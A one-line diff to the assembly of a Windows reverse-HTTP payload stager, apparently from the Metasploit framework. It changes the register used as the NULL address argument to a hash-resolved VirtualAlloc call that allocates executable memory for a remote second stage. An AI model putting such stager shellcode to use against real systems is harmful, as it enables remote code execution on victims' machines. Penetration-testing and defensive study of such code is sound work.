@@ -501,7 +501,7 @@ module Payload::Windows::ReverseHttp
       push 0x40              ; PAGE_EXECUTE_READWRITE
       push 0x1000            ; MEM_COMMIT
       push 0x00400000        ; Stage allocation (4Mb ought to do us)
-      push eax               ; NULL as we dont care where the allocation is
+      push ebx               ; NULL as we dont care where the allocation is
       push #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualAlloc')}
       call ebp               ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
 
